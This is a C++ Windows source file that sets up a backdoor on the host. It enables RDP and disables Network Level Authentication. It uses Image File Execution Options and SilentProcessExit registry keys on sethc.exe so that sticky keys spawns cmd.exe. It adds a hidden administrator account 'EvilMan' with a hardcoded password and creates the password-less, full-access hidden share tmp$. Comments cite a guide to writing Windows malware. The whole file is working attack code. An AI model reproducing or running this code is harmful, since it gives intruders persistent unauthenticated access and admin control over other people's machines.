#define UNICODE
#include <stdlib.h>
#include <windows.h>
#include <lm.h>
#include <stdio.h>
#include <fileapi.h>
#include <iostream>
#pragma comment(lib, "Netapi32.lib")
#define reg_type HKEY_LOCAL_MACHINE

int main()
{
	
	/*-------------------------------------------------------------------------------------------*/
	/*--------------------------   Persistent RDP / NLA Disabled   ------------------------------*/
	/*-------------------------------------------------------------------------------------------*/

	/*
	LSTATUS RegOpenKeyExA(
		HKEY   hKey,
		LPCSTR lpSubKey,
		DWORD  ulOptions,
		REGSAM samDesired,
		PHKEY  phkResult
	);

	LSTATUS RegSetValueExA(
		HKEY       hKey,
		LPCSTR     lpValueName,
		DWORD      Reserved,
		DWORD      dwType,
		const BYTE *lpData,
		DWORD      cbData
	);

	*/
	
	/* https://wumb0.in/Writing-Me-Some-Windows-Malware.html */

	HKEY rdpKey;
	DWORD rdpVal[MAX_PATH];
	DWORD lpd = MAX_PATH;
	DWORD dwType = REG_DWORD;
	//enable RDP forever
	
		DWORD newVal = 0;
		//open the key
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server", 0, KEY_ALL_ACCESS, &rdpKey) != ERROR_SUCCESS);
					/*printf("Could not open RDP registry key\\n");*/
				else {
					//query the value in fDenyTSConnections
					if (RegQueryValueEx(rdpKey, L"fDenyTSConnections", NULL, &dwType, (LPBYTE)rdpVal, &lpd) != ERROR_SUCCESS) 
					{
						if (RegSetValueEx(rdpKey, L"fDenyTSConnections", NULL, REG_DWORD, (const BYTE*)&newVal, sizeof(DWORD)) != ERROR_SUCCESS) 
						{
							/*printf("Failed to set RDP key");*/
						}
					}
				else {
						if (rdpVal[0] != (char)0) 
						{
							//set it back to 0!
							if (RegSetValueEx(rdpKey, L"fDenyTSConnections", NULL, REG_DWORD, (const BYTE*)&newVal, sizeof(DWORD)) != ERROR_SUCCESS) 
							{
								/*printf("Failed to set RDP key");*/
							}
						}
				}
		}
	RegCloseKey(rdpKey);



	HKEY winstaKey;
	DWORD winstaVal[MAX_PATH];
	DWORD winstalpd = MAX_PATH;
	DWORD dwType_winsta = REG_DWORD;
	//enable RDP forever

	DWORD newVal_winsta = 0;
	//open the key
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", 0, KEY_ALL_ACCESS, &winstaKey) != ERROR_SUCCESS);
		/*printf("Could not open winsta registry key\\n");*/
	else {
		//query the value in fDenyTSConnections
		if (RegQueryValueEx(winstaKey, L"UserAuthentication", NULL, &dwType_winsta, (LPBYTE)winstaVal, &winstalpd) != ERROR_SUCCESS)
		{
			if (RegSetValueEx(winstaKey, L"UserAuthentication", NULL, REG_DWORD, (const BYTE*)&newVal_winsta, sizeof(DWORD)) != ERROR_SUCCESS)
			{
				/*printf("Failed to set winsta key");*/
			}
		}
		else {
			if (winstaVal[0] != (char)0)
			{
				//set it back to 0!
				if (RegSetValueEx(winstaKey, L"UserAuthentication", NULL, REG_DWORD, (const BYTE*)&newVal_winsta, sizeof(DWORD)) != ERROR_SUCCESS)
				{
					/*printf("Failed to set winsta key");*/
				}
			}
		}
	}
	RegCloseKey(winstaKey);
		
	
	
	
	//system("start REG ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t reg_dword /d 0x00000000 /f");
	
	/*-------------------------------------------------------------------------------------------*/
	/*--------------------------          sethc  standard         -------------------------------*/
	/*-------------------------------------------------------------------------------------------*/
	
	/* https://wumb0.in/Writing-Me-Some-Windows-Malware.html */
	
	/*
	HKEY debug_sethcKey;
	
	LPTSTR debugger_val;
	debugger_val = LPTSTR(L"C:\\windows\\system32\\calc.msi");
	DWORD debugger_len = lstrlen(debugger_val);
	

	//Sticky keys prompt
	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe", NULL, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &debug_sethcKey, NULL != ERROR_SUCCESS)) {
		printf("Sethc Key not created successfully\\n");
	}
	else {
		if (RegSetValueEx(debug_sethcKey, L"Debugger", NULL, REG_SZ, (const BYTE*)debugger_val, debugger_len *2 ) != ERROR_SUCCESS) {
			printf("Failed to set sethc key");
		}
	}
	RegCloseKey(debug_sethcKey);
	
	
	
	*/
	
	
	/*------------ CREATE GLOBAL FLAG-------------*/

	/* https://wumb0.in/Writing-Me-Some-Windows-Malware.html */
	/* https://www.programmersought.com/article/18196816141/ */


	HKEY sethcKey;
	
	DWORD GLOBAL_lpd = MAX_PATH;
	//DWORD GLOBALVal[MAX_PATH];
	DWORD szType = REG_SZ;
	DWORD new_GLOBAL_Val = 512;

	//Sticky keys prompt
	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe", NULL, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &sethcKey, NULL != ERROR_SUCCESS)) {
		printf("Sethc Key not created successfully\\n");
	}
	else {
		
			if (RegSetValueEx(sethcKey, L"GlobalFlag", NULL, REG_DWORD, (const BYTE *)&new_GLOBAL_Val , sizeof(DWORD)) != ERROR_SUCCESS) {
				printf("Failed to set sethc key");
			}
		
		}
	RegCloseKey(sethcKey);

	/*------------ CREATE -------------*/

	HKEY reporting_sethcKey;

	DWORD reporting_lpd = MAX_PATH;
	//DWORD GLOBALVal[MAX_PATH];
	LPTSTR monitor_val;
	

	monitor_val = LPTSTR(L"C:\\windows\\system32\\cmd.exe");
	DWORD len = lstrlen(monitor_val);
	DWORD reporting_Val = 1;

	//Sticky keys prompt
	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\\\\sethc.exe", NULL, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reporting_sethcKey, NULL != ERROR_SUCCESS)) {
		printf("Sethc Key not created successfully\\n");
	}
	else {

		if (RegSetValueEx(reporting_sethcKey, L"ReportingMode", NULL, REG_DWORD, (const BYTE *)&reporting_Val, sizeof(DWORD)) != ERROR_SUCCESS) {
			printf("Failed to set sethc key");
		}

		if (RegSetValueEx(reporting_sethcKey, L"MonitorProcess", NULL, REG_SZ, (LPBYTE)monitor_val, len * 2) != ERROR_SUCCESS) {
			printf("Failed to set sethc key");
		}
	}
	RegCloseKey(reporting_sethcKey);



	/*-------------------------------------------------------------------------------------------*/
	/*--------------------------           Create USER            -------------------------------*/
	/*-------------------------------------------------------------------------------------------*/


	
		USER_INFO_1 ui;
		DWORD dwLevel = 1;
		DWORD dwError = 0;
		NET_API_STATUS nStatus;

		ui.usri1_name = LPWSTR(L"EvilMan");
		ui.usri1_password = LPWSTR(L"Ev1l.m4n.1234");
		ui.usri1_priv = USER_PRIV_USER;
		ui.usri1_home_dir = NULL;
		ui.usri1_comment = NULL;
		ui.usri1_flags = UF_SCRIPT /*| UF_PASSWD_CANT_CHANGE | UF_PASSWD_NOTREQD*/;
		ui.usri1_script_path = NULL;

		nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);
		switch (nStatus)
		{
		case NERR_Success:
		{
			fprintf(stderr, "SUCCESS!\n");
			break;
		}
		case NERR_InvalidComputer:
		{
			fprintf(stderr, "A system error has occurred: NERR_InvalidComputer\n");
			break;
		}
		case NERR_NotPrimary:
		{
			fprintf(stderr, "A system error has occurred: NERR_NotPrimary\n");
			break;
		}
		case NERR_GroupExists:
		{
			fprintf(stderr, "A system error has occurred: NERR_GroupExists\n");
			break;
		}
		case NERR_UserExists:
		{
			fprintf(stderr, "A system error has occurred: NERR_UserExists\n");
			break;
		}
		case NERR_PasswordTooShort:
		{
			fprintf(stderr, "A system error has occurred: NERR_PasswordTooShort\n");
			break;
		}
		case ERROR_ACCESS_DENIED:
		{
			fprintf(stderr, "A system error has occurred: ERROR_ACCESS_DENIED\n");
			break;
		}
		}

		

		LOCALGROUP_MEMBERS_INFO_3 lmi3;
		ZeroMemory(&lmi3, sizeof lmi3);
		lmi3.lgrmi3_domainandname = ui.usri1_name;
		DWORD err = NetLocalGroupAddMembers(NULL, L"administrators", 3, (LPBYTE)&lmi3, 1);

		/*-------------------------------------------------------------------------------------------*/
		/*------------------------------    Create DIRECTORY   --------------------------------------*/
		/*-------------------------------------------------------------------------------------------*/



		CreateDirectory(L"C:\\tmp", NULL);



		/*-------------------------------------------------------------------------------------------*/
		/*-------------------------------     CREATE SHARE    ---------------------------------------*/
		/*-------------------------------------------------------------------------------------------*/


		typedef struct _MY_SHARE_INFO_2 {
			LPTSTR shi2_netname;
			DWORD shi2_type;
			LPTSTR shi2_remark;
			DWORD shi2_permissions;
			DWORD shi2_max_uses;
			DWORD shi2_current_uses;
			LPTSTR shi2_path;
			LPTSTR shi2_passwd;
		} MY_SHARE_INFO_2, *PMYSHARE_INFO_2, *LPMYSHARE_INFO_2;



		NET_API_STATUS res;
		_MY_SHARE_INFO_2 p;
		DWORD parm_err = 0;
	
		p.shi2_netname = LPTSTR(L"tmp$");
		p.shi2_type = STYPE_DISKTREE;
		p.shi2_remark = LPTSTR(L"NetShareAdd");
		p.shi2_permissions = ACCESS_ALL;
		p.shi2_max_uses = 4;
		p.shi2_current_uses = 0;
		p.shi2_passwd = NULL; // no password
		
		p.shi2_path = LPTSTR(L"C:\\tmp");

		res = NetShareAdd(NULL,2,(LPBYTE) &p, &parm_err);
		/*if (res == 0)
			printf("Share created.\n");
		else
			printf("Share not.\n");
		return 0; */
}
